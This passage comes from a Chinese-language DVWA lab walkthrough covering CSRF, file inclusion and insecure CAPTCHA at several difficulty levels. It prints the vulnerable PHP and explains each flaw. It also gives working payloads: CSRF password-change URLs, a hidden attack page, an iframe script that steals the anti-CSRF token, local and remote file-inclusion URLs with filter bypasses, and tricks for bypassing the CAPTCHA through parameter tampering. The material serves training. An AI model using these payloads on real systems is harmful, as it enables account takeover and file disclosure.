+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );//md5加密pass_new
+
+        // 更新数据库密码
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+        // 返回密码改变到前端
+        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+    }
+    else {
+        // Issue with passwords matching
+        echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt; </code></pre>
+<p>这里对CSRF没有防御机制（只检查cookie）</p>
+<h3 id="检测csrf的方法："><a href="#检测csrf的方法：" class="headerlink" title="检测csrf的方法："></a>检测csrf的方法：</h3><h5 id="1-burp抓包"><a href="#1-burp抓包" class="headerlink" title="1.burp抓包"></a>1.burp抓包</h5><h5 id="2-右键工具中使用csrf-poc工具"><a href="#2-右键工具中使用csrf-poc工具" class="headerlink" title="2.右键工具中使用csrf poc工具"></a>2.右键工具中使用csrf poc工具</h5><h5 id="3-创造站点"><a href="#3-创造站点" class="headerlink" title="3.创造站点"></a>3.创造站点</h5><h5 id="4-访问浏览器"><a href="#4-访问浏览器" class="headerlink" title="4.访问浏览器"></a>4.访问浏览器</h5><h5 id="5-出现密码修改存在csrf"><a href="#5-出现密码修改存在csrf" class="headerlink" title="5.出现密码修改存在csrf"></a>5.出现密码修改存在csrf</h5><p>最基础的改密码payload</p>
+<pre><code>http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change </code></pre>
+<p>payload中可以看到密码已被修改，且有在前端提示</p>
+<p><strong>C) 构造攻击页面</strong></p>
+<p>查看本机ip</p>
+<pre><code>172.20.10.5</code></pre>
+<p>诱导用户访问该ip</p>
+<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p>
+<pre><code>&lt;img src="http://172.20.10.5
+/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change " border="0" style="display:none;"/&gt;
+
+&lt;h1&gt;404&lt;h1&gt;
+
+&lt;h2&gt;file not found.&lt;h2&gt;</code></pre>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\黑客站点.png" alt="黑客站点"></p>
+<p>这台机器的IP</p>
+<p>访问IP默认会打开index.php。那么就意味着，我把index里面的内容换成上述的代码，并且诱导用户浏览器访问这个IP就可以达到我不可告人的目的</p>
+<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // 检查请求
+    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
+       //检查前后密码是否一致
+        $pass_new  = $_GET[ 'password_new' ];
+        $pass_conf = $_GET[ 'password_conf' ];      
+        if( $pass_new == $pass_conf ) {
+            // 一致时
+            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+            $pass_new = md5( $pass_new );
+            // 更新数据库
+            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+            // Feedback for the user
+            echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+        }
+        else {
+            // Issue with passwords matching
+            echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";
+        }
+    }
+    else {
+        // Didn't come from a trusted source
+        echo "&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+</code></pre>
+<h3 id="stripos-string-find-start"><a href="#stripos-string-find-start" class="headerlink" title="stripos(string,find,start)"></a>stripos(string,find,start)</h3><p>返回字符串在另一字符串中第一次出现的位置（不区分大小写），如果没有找到字符串则返回 FALSE。</p>
+<p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是127.0.0.1），希望通过这种机制抵御CSRF攻击。</p>
+<p>Host 192.168.31.155</p>
+<p>Referer <a target="_blank" rel="noopener" href="http://192.168.31.103/192.168.31.155.php">http://192.168.31.103/192.168.31.155.php</a></p>
+<p>从技术上就可以绕过了，但是新构造的这个192.168.31.155.php，很容易被发现，只有进行URL转码了</p>
+<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Check Anti-CSRF token
+//可以看到加入了token机制
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+        // Feedback for the user
+        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+    }
+    else {
+        // Issue with passwords matching
+        echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+<p>客户端访问修改密码页面-&gt;服务器发一个token-&gt;用户修改参数的请求中加入了token参数-&gt;服务器验证token-&gt;成功修改</p>
+<p>相当于把流程修改了，token的生成是随机的</p>
+<p>构建这个恶意链接就不可取了因为token是随机的无法伪造</p>
+<pre><code>&lt;script type="text/javascript"&gt;
+    function attack(){
+        document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
+        document.getElementById("transfer").submit(); 
+    }
+&lt;/script&gt;
+
+&lt;iframe src="http://172.16.134.26/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;"&gt;
+&lt;/iframe&gt;
+
+&lt;body onload="attack()"&gt;
+    &lt;form method="GET" id="transfer" action="http://172.16.134.26/dvwa/vulnerabilities/csrf"&gt;
+        &lt;input type="hidden" name="password_new" value="password"&gt;
+        &lt;input type="hidden" name="password_conf" value="password"&gt;
+        &lt;input type="hidden" name="user_token" value=""&gt;
+        &lt;input type="hidden" name="Change" value="Change"&gt;
+    &lt;/form&gt;
+&lt;/body&gt;</code></pre>
+<h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+//输入原来的密码
+    $pass_curr = $_GET[ 'password_current' ];
+    $pass_new  = $_GET[ 'password_new' ];
+    $pass_conf = $_GET[ 'password_conf' ];
+
+    // Sanitise current password input
+    $pass_curr = stripslashes( $pass_curr );
+    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $pass_curr = md5( $pass_curr );
+
+    // Check that the current password is correct
+    $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+    $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+    $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );
+    $data-&gt;execute();
+
+    // Do both new passwords match and does the current password match the user?
+    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
+        // It does!
+        $pass_new = stripslashes( $pass_new );
+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );
+
+        // Update database with new password
+        $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
+        $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );
+        $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+        $data-&gt;execute();
+
+        // Feedback for the user
+        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+    }
+    else {
+        // Issue with passwords matching
+        echo "&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;";
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>要求输入原始密码</p>
+<h1 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h1><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启alLow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的alLow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）</p>
+<h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+// The page we wish to display
+$file = $_GET[ 'page' ];
+?&gt; </code></pre>
+<h4 id="1、本地文件包含"><a href="#1、本地文件包含" class="headerlink" title="1、本地文件包含"></a>1、本地文件包含</h4><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php</code></pre>
+<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></pre>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\本地文件包含.png" alt="本地文件包含"></p>
+<h4 id="2、远程文件包含"><a href="#2、远程文件包含" class="headerlink" title="2、远程文件包含"></a><strong>2、远程文件包含</strong></h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<p>在远程服务器 172.16.135.47 上传一个phpinfo.txt文件，内容如下</p>
+<pre><code>&lt;?php
+phpinfo();
+?&gt;</code></pre>
+<pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/?page=http://172.20.10.5/dvwa/phpinfo可以编码</code></pre>
+<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+//将参数中的http:// https:// ../ ..\都替换成空
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\"" ), "", $file );
+
+?&gt;</code></pre>
+<p>使用str_replace函数是极其不安全的，因为可以使用<strong>双写绕过</strong>替换规则。</p>
+<h4 id="1、本地文件包含-1"><a href="#1、本地文件包含-1" class="headerlink" title="1、本地文件包含"></a><strong>1、本地文件包含</strong></h4><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\software\wamp\www\dvwa\php.ini</code></pre>
+<h4 id="2、远程文件包含-1"><a href="#2、远程文件包含-1" class="headerlink" title="2、远程文件包含"></a><strong>2、远程文件包含</strong></h4><pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/page=htthttp://p://172.20.10.5/dvwa/phpinfo.txt</code></pre>
+<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+//文件名以file开始，或者只能为include.php
+if( !fnmatch( "file*", $file ) &amp;&amp; $file != "include.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?&gt;</code></pre>
+<p><strong>fnmatch()</strong> 函数根据指定的模式来匹配文件名或字符串。</p>
+<p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以<strong>利用**</strong>file**<strong>协议绕过防护策略</strong>。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议</p>
+<pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/?page=file:///D:/software/wamp/www/dvwa/php.ini</code></pre>
+<h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != "include.php" &amp;&amp; $file != "file1.php" &amp;&amp; $file != "file2.php" &amp;&amp; $file != "file3.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?&gt;</code></pre>
+<p>Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
+<h1 id="Insecure-CAPTCHA（不安全的验证码-不安全的验证流程）"><a href="#Insecure-CAPTCHA（不安全的验证码-不安全的验证流程）" class="headerlink" title="Insecure CAPTCHA（不安全的验证码/不安全的验证流程）"></a>Insecure CAPTCHA（不安全的验证码/不安全的验证流程）</h1><p>Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅</p>
+<p>DVWA中主要是输入当前的密码以及新密码，用来修改密码<br>![insecure captcha](D:\blog\source_posts\DVWA\insecure captcha.jpg)</p>
+<h4 id="reCAPTCHA验证流程"><a href="#reCAPTCHA验证流程" class="headerlink" title="reCAPTCHA验证流程"></a><strong>reCAPTCHA验证流程</strong></h4><p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\recaptcha.png" alt="recaptcha"></p>
+<p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p>
+<p><strong>recaptcha_check_answer(*p\</strong>r*<em>i*</em>v*<em>k*</em>e*<em>y\</em>,**</p>
+<p><strong>remoteip, *c\</strong>h*<em>a*</em>l*<em>l*</em>e*<em>n*</em>g*<em>e\</em>,**</p>
+<p><strong>response)</strong></p>
+<p>参数<em>p<strong>r</strong>i<strong>v</strong>k<strong>e</strong>y</em>是服务器申请的<em>p<strong>r</strong>i<strong>v</strong>a<strong>t</strong>e<strong>k</strong>e**y</em>，</p>
+<p>remoteip是用户的ip，<em>c<strong>h</strong>a<strong>l</strong>l<strong>e</strong>n<strong>g</strong>e</em>是<em>r<strong>e</strong>c<strong>a</strong>p<strong>t</strong>c<strong>h</strong>a<strong>c</strong>h<strong>a</strong>l<strong>l</strong>e<strong>n</strong>g<strong>e</strong>f<strong>i</strong>e<strong>l</strong>d</em>字段的值，来自前端页面，</p>
+<p>response是 recaptcha_response_field 字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</p>
+<ul>
+<li>$is_valid是布尔型的，表示校验是否有效，</li>
+<li>$error是返回的错误代码。</li>
+</ul>
+<h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+//验证身份
+if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {
+    // 隐藏验证码表单
+    $hide_form = true;
+
+    // 获得且确认新密码
+    $pass_new  = $_POST[ 'password_new' ];
+    $pass_conf = $_POST[ 'password_conf' ];
+
+    //第三方身份验证
+    $resp = recaptcha_check_answer(
+        $_DVWA[ 'recaptcha_private_key'],
+        $_POST['g-recaptcha-response']
+    );
+
+    // Did the CAPTCHA fail?
+    if( !$resp ) {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";
+        $hide_form = false;
+        return;
+    }
+    else {
+        // CAPTCHA was correct. Do both new passwords match?
+        if( $pass_new == $pass_conf ) {
+            // Show next stage for the user
+            $html .= "
+                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
+                &lt;form action=\"#\" method=\"POST\"&gt;
+                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;
+                    &lt;input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /&gt;
+                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /&gt;
+                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;
+                &lt;/form&gt;";
+        }
+        else {
+            // Both new passwords do not match.
+            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";
+            $hide_form = false;
+        }
+    }
+}
+//检查两次密码是否一致，并更新密码
+if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ 'password_new' ];
+    $pass_conf = $_POST[ 'password_conf' ];
+
+    // Check to see if both password match
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );
+
+        // Update database
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+        // Feedback for the end user
+        $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+    }
+    else {
+        // Issue with the passwords matching
+        $html .= "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";
+        $hide_form = false;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</code></pre>
+<p>可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
+<p><strong>1.通过构造参数绕过验证过程的第一步</strong></p>
+<p>首先输入密码，点击Change按钮，抓包：</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424102955500-586208657.png" alt="1375459-20200424102955500-586208657"></p>
+<p>更改step参数绕过验证码</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424103056556-345258237.png" alt="1375459-20200424103056556-345258237"></p>
+<p>修改密码成功<img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424102602206-758466382.png" alt="1375459-20200424102602206-758466382"></p>
+<p><strong>2.由于没有任何的防CSRF机制，我们可以轻易地构造攻击页面</strong><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424103739253-2010034458.png" alt="1375459-20200424103739253-2010034458"></p>
+<p>当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。<img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424103812914-454750515.png" alt="1375459-20200424103812914-454750515"></p>
+<p>受害者会看到更改密码成功的界面</p>
+<h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ 'password_new' ];
+    $pass_conf = $_POST[ 'password_conf' ];
+
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ 'recaptcha_private_key' ],
+        $_POST['g-recaptcha-response']
+    );
+
+    // Did the CAPTCHA fail?
+    if( !$resp ) {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";
+        $hide_form = false;
+        return;
+    }
+    else {
+        // CAPTCHA was correct. Do both new passwords match?
+        if( $pass_new == $pass_conf ) {
+            // Show next stage for the user
+            $html .= "
+                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
+                &lt;form action=\"#\" method=\"POST\"&gt;
+                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;
+                    &lt;input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /&gt;
+                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /&gt;
+                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt;
+                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;
+                &lt;/form&gt;";
+        }
+        else {
+            // Both new passwords do not match.
+            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";
+            $hide_form = false;
+        }
+    }
+}
+
+if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ 'password_new' ];
+    $pass_conf = $_POST[ 'password_conf' ];
+
+    // Check to see if they did stage 1----检查passed_captcha参数值
+    if( !$_POST[ 'passed_captcha' ] ) {
+        $html     .= "&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;";
+        $hide_form = false;
+        return;
+    }
+
+    // Check to see if both password match
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+        $pass_new = md5( $pass_new );
+
+        // Update database
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+        // Feedback for the end user
+        $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+    }
+    else {
+        // Issue with the passwords matching
+        $html .= "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";
+        $hide_form = false;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</code></pre>
+<p>可以看到，Medium级别的代码依然将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。与Low级别不同的是，在第二步验证时，增加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。</p>
+<p><strong>1.可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码。</strong><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424104918595-2017076591.png" alt="1375459-20200424104918595-2017076591"></p>
+<p>改了</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424105017920-2107330620.png" alt="1375459-20200424105017920-2107330620"></p>
+<h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+if( isset( $_POST[ 'Change' ] ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ 'password_new' ];
+    $pass_conf = $_POST[ 'password_conf' ];
+
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ 'recaptcha_private_key' ],
+        $_POST['g-recaptcha-response']
+    );
+//（通过身份验证条件）或者 （参数g-recaptcha-respon为hidd3n_valu3并且参数 HTTP_USER_AGE为 reCAPTC）就算是验证通过了
+    if (
+        $resp || 
+        (
+            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
+            &amp;&amp; $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
+        )
+    ){
+        // CAPTCHA was correct. Do both new passwords match?
+        if ($pass_new == $pass_conf) {
+            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+            $pass_new = md5( $pass_new );
+
+            // Update database
+            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
+            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+            // Feedback for user
+            echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";
+
+        } else {
+            // Ops. Password mismatch
+            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";
+            $hide_form = false;
+        }
+
+    } else {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";
+        $hide_form = false;
+        return;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+<p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是true，或者 参数g-recaptcha-response等于hidd3n_valu3并且http包头的User-Agent参数等于reCAPTCHA 时，就认为验证码输入正确，通过了验证码的检查。</p>
+<p>搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数g-recaptcha-response、User-Agent上。</p>
+<p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424110756298-1402975162.png" alt="1375459-20200424110756298-1402975162"></p>
